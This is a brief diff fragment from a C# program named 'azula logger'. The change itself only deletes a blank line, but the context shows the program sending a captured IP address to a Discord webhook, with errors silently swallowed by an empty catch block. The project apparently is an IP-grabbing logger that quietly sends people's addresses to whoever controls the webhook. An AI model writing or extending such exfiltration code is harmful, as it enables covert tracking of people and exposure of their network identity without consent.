@@ -23,7 +23,6 @@ namespace azula_logger
                 //Sending the ip throught the webhook
                 websend.sendDiscordWebhook(webhook, "azula logger", "IP: \n" + IP + "-------------------------", image);
                 Thread.Sleep(100);
-
             }
             }
             catch{ }
